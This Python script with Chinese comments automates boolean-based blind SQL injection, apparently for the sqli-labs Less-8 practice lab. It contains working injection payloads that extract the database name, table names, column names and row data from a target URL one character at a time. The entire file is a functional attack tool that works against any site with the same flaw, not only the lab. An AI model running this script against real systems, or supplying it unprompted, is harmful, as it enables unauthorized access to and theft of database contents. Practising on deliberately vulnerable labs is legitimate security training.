#!/usr/bin/python3
# -*- coding: utf-8 -*-

#1.导入所需要用到的库
import requests 
import optparse

DBname = ""#存放数据库名的变量
DBTables = [] #存放数据库表的变量
DBColumns =[] #存放数据库字段的变量
DBData = {} #存放数据字典的变量，键位字段名，值为字段数据列表

flag = "You are in......."

#设置重连次数以及将连接改为短链接
#防止因为HTTP连接过多导致的 Max retries exceeded with url问题
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False

#2.编写主函数，用来调用各个函数进行自动化注入

def StartSqli(url):
    GetDBName(url)#获取数据库名
    print("[+]当前数据库名{0}:".format(DBname))
    GetDBTables(url,DBname)#获取数据表名
    print("[+]数据库{0}的表如下：".format(DBname))
    for item in range(len(DBTables)):
        print("("+str(item+1)+")"+DBTables[item])#打印出当前数据库下所有的表
    tableIndex = int(input("[*]请输入要查看的表的序号："))-1
    GetDBColumns(url,DBname,DBTables[tableIndex])#获取选择的表的字段
    while True:
        print("[+]数据表{0}的字段如下：".format(DBTables[tableIndex]))
        for item in range(len(DBColumns)):
            print("("+str(item+1)+")" +DBColumns[item])#打印字段
        columnIndex = int(input("[*]请输入要查看的字段的序号（输入0退出）"))-1
        if(columnIndex == -1):
            break
        else:
            GetDBData(url,DBTables[tableIndex],DBColumns[columnIndex])#调用获取数据函数

# 3.编写获取数据库名的函数，根据得到的URL获取数据库名并把最后的结果存入DBName
def GetDBName(url):
    global DBname
    print("[-]开始获取数据库的长度")
    DBnameLen = 0
    payload = "' and if(length(database())={0},1,0) %23"#获取数据库名的长度
    targetURL = url + payload
    for DBnameLen in range(1,99):
        res = conn.get(targetURL.format(DBnameLen))
        if flag in res.content.decode("utf-8"):
            print("[+]数据库名的长度:" + str(DBnameLen))
            break
    print("[-]开始获取数据库名")
    payload = "' and if(ascii(substr(database(),{0},1))={1},1,0) %23"#获取数据库名的具体数据
    targetUrl = url + payload
# a表示substr()函数的截取起始位置
    for a in range(1, DBnameLen+1):
# b表示在ASCII码中33～126位可显示的字符
        for b in range(33, 127):
            res = conn.get(targetUrl.format(a,b))
            if flag in res.content.decode("utf-8"):
                DBname += chr(b) #ascii转为字符串
                print("[-]"+ DBname)
                break

def GetDBTables(url,dbname):
    global DBTables
    DBTableCount = 0
    print("[-]开始获取{0}数据库表数量".format(dbname))
    payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23" #获取数据表的数量，这里有两个变量，一个是库名，还有一个是表的数量
    targetUrl = url + payload
    for DBTableCount in range(1,99):
        res = conn.get(targetUrl.format(dbname,DBTableCount))
        if flag in res.content.decode("utf-8"):
            print("[+]{0}数据库中表的数量为:{1}".format(dbname, DBTableCount))#打印出数量
            break
    print("[-]开始获取{0}数据库的表".format(dbname))
    tableLen = 0
    for a in range(0,DBTableCount):
        print("[-]正在获取第{0}个表名".format(a+1))
        for tableLen in range(1,99):
            payload = "' and if((select length(table_name) from information_schema.tables where table_schema='{0}' limit{1},1)={2},1,0) %23"#打印出长度
            targetUrl=url + payload
            res = conn.get(targetUrl.format(dbname,a,tableLen))
            if flag in res.content.decode("utf-8"):
                break
        table=""
        for b in range(1,tableLen+1):
            payload ="' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},1,0) %23" #打印出内容
            targetUrl = url + payload
            #c表示在ascii码中33-156位可显示字符      
            for c in range(33,127):
                res = conn.get(targetUrl.format(dbname,a,b,c))
                if flag in res.content.decode("utf-8"):
                    table += chr(c)
                    print(table)
                    break
        DBTables.append(table)
        table = ""
        
def GetDBColumns(url,dbname,dbtable):
    global DBColumns
    DBColumnCount = 0 
    print("[+]开始获取{0}数据表的字段数：".format(dbtable))
    for DBColumnCount in range(99):
        payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,0) %23"#列的长度
        targetUrl = url +payload
        res = conn.get(targetUrl.format(dbname,dbtable,DBColumnCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
            break
    
    #开始获取字段的名称
    column = ""
    for a in range(0,DBColumnCount):
        print("[-]正在获取第{0}个字段名".format(a+1))
        for columnLen in range(99):
            payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},1,0) %23"#列名称的长度
            targetUrl = url + payload
            res=conn.get(targetUrl.format(dbname,dbtable,a,columnLen))
            if flag in res.content.decode("utf-8"):
                break
        
        #b表示当前字段名猜解的位置
        for b in range(1,columnLen+1):
            payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},1,0) %23"#列的字符串内容
            targetUrl = url + payload
            for c in range(33,127):
                res = conn.get(targetUrl.format(dbname,dbtable,a,b,c))
                if flag in res.content.decode("utf-8"):
                    column += chr(c)
                    print(column)
                    break
        DBColumns.append(column)
        column = ""


def GetDBData(url,dbtable,dbcolumn):
    global DBData
    DBDataCount = 0
    print("[-]开始获取{0}表{1}字段的数据数量".format(dbtable,dbcolumn))
    for DBDataCount in range(99):
        payload = "'and if((select count({0}) from {1})={2},1,0) %23" #获取数据总量
        targetURL= url + payload
        res = conn.get(targetURL.format(dbcolumn,dbtable,DBDataCount))
        if flag in res.content.decode("utf-8"):
            print("[-]{0}表{1}字段的数据数量为:{2}".format(dbtable, dbcolumn,DBDataCount))
            break
    for a in range(0,DBDataCount):
        print("[-]正在获取{0}的第{1}个数据".format(dbcolumn,a+1))
        dataLen = 0
        for dataLen in range(99):
            payload ="'and if ((select length({0}) from {1} limit {2},1)={3},1,0) %23" #获取数据长度
            targetURL = url + payload 
            res = conn.get(targetURL.format(dbcolumn,dbtable,a,dataLen))
            if flag in res.content.decode("utf-8"):
                print("[-]第{0}个数据长度为:{1}".format(a+1,dataLen))
                break
        data =""
        for b in range(1,dataLen+1):
            for c in range(33,127):
                payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},1,0) %23" #获取数据内容
                targetURL = url + payload
                res = conn.get(targetURL.format(dbcolumn,dbtable,a,b,c))
                if flag in res.content.decode("utf-8"):
                    data +=chr(c)
                    print(data)
                    break

        DBData.setdefault(dbcolumn,[]).append(data)
        print(DBData)
        data = ""


if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog -u url \n\n' 'Example:python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n') #添加示例说明
    parser.add_option('-u','--url',dest='targetURL',default="http://127.0.0.1/sql/Less-8/?id=1",type="string",help="target URL") #添加参数
    (options,arg) = parser.parse_args() #实例化，并将其变为数组
    StartSqli(options.targetURL)#将数组值传入